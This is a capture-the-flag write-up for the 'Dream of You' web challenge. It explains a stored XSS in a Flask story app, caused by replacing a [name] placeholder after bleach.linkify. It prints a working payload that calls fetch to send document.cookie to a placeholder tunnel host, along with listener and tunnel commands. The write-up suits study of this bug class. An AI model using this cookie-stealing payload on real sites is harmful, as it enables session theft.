# Dream of You

## Summary

The challenge is a small Flask app where users can post stories containing a `[name]` placeholder. A reader bot visits a submitted story with a `flag` cookie set and types a name into the page.

The bug is a stored XSS caused by this order of operations in [`dream-of-you/app/app.py`](https://github.com/prathamgupta36/CTF-Writeups/blob/main/2026/tkbctf5_2026/web/dream-of-you/dream-of-you/app/app.py):

1. Sanitize the story with `bleach.clean(...)`
2. Auto-link URLs with `bleach.linkify(...)`
3. Replace `[name]` with user-controlled text using raw string replacement
4. Mark the result as trusted HTML with `Markup(...)`

Because the placeholder replacement happens after `linkify`, attacker-controlled `default_name` can break out of an `<a href="...">` attribute and inject new attributes into the generated anchor.

## Source Review

The interesting route is:

```python
@app.get("/read/<int:story_id>")
def read_story(story_id: int):
    ...
    name = request.args.get("name") or story["default_name"]
    name = sanitize_text(name.strip())
    content = story["content"].replace("[name]", "[name] ")
    sanitized = sanitize_text(content)
    linkified = linkify_text(sanitized)
    rendered = linkified.replace("[name]", name)
    return render_template(..., story=Markup(rendered))
```

Important details:

- `default_name` is attacker-controlled on story creation.
- `default_name` is limited to 20 bytes.
- `story` is inserted with `|safe`.
- The bot sets a cookie named `flag`, visits `/read/<id>`, then clicks the name input and submits the form.

The bot code in [`dream-of-you/reader_bot/app.js`](https://github.com/prathamgupta36/CTF-Writeups/blob/main/2026/tkbctf5_2026/web/dream-of-you/dream-of-you/reader_bot/app.js) does:

1. `page.setCookie({ name: "flag", value: flag, ... httpOnly: false })`
2. `page.goto(targetUrl, ...)`
3. Click the `name` input
4. Type `Mahiru`
5. Click the submit button

So if we can create an autofocus element with an `onblur` handler, the bot will trigger it when it clicks the input field.

## Root Cause

The intended protection is:

- `bleach.clean()` removes tags
- `bleach.linkify()` safely converts URLs to links

But the app then performs:

```python
rendered = linkified.replace("[name]", name)
```

If `[name]` appears inside a generated URL, the replacement happens inside the `href` attribute and also inside the anchor text. That means a value like:

```text
"autofocus onblur='/
```

turns:

```html
<a href="mailto:test@example.com/[name]">
```

into something like:

```html
<a href="mailto:test@example.com/" autofocus onblur='/...'>
```

That gives us an attacker-controlled event handler on an autofocus element.

## Why `mailto:` Matters

Most auto-linked URLs receive `rel="nofollow"`, which adds extra junk after the injected attribute and makes the 20-byte budget much harder to use.

`mailto:` links are special here: `bleach.linkify()` does not add `rel="nofollow"` to them in this case, so the resulting HTML is shorter and easier to control.

That is what makes the final payload fit.

## Exploit Strategy

We need:

1. A generated link containing `[name]`
2. The replacement to inject `autofocus onblur=...`
3. The bot to blur that element by clicking the name input
4. The handler to exfiltrate `document.cookie`

The final `default_name` was:

```text
"autofocus onblur='/
```

This is only 19 bytes, so it fits the `default_name <= 20` limit.

The story content was:

```text
mailto:test@example.com/;fetch(&#39;https://YOUR-TUNNEL/&#39;+document.cookie)//[name]
```

After `linkify()` and placeholder replacement, the anchor becomes effectively:

```html
<a href="mailto:test@example.com/;fetch('https://YOUR-TUNNEL/'+document.cookie)//"
   autofocus
   onblur='/...'>
```

The parsing trick is:

- the injected handler starts with `/`
- the first `/` in the `mailto:` path closes a regex literal
- the following `;fetch(...)` is then parsed as JavaScript
- the trailing `//` comments out the rest

So when the autofocus anchor loses focus, the browser executes:

```js
fetch('https://YOUR-TUNNEL/' + document.cookie)
```

## End-to-End Solve

I wrote the exploit helper in [`exploit.py`](https://github.com/prathamgupta36/CTF-Writeups/blob/main/2026/tkbctf5_2026/web/dream-of-you/exploit.py).

Usage:

```bash
nc -lvnp 8899
ssh -o StrictHostKeyChecking=no -R 80:localhost:8899 nokey@localhost.run
python3 exploit.py http://TARGET_HOST:PORT https://YOUR-TUNNEL.lhr.life
```

Even if `/report` returns `500 Reader failed`, the exploit may still have fired already. In the live solve, the callback arrived and disclosed:

```text
tkbctf{https://www.youtube.com/watch?v=Bg0yQtrqR_A}
```

## Final Flag

```text
tkbctf{https://www.youtube.com/watch?v=Bg0yQtrqR_A}
```

## Takeaway

This challenge is a good example of a common anti-pattern:

- sanitize HTML
- transform it into HTML
- mutate the resulting HTML with raw string replacement

Once the content is HTML, later string operations are not structure-aware anymore. That is what turned safe text replacement into a stored XSS.
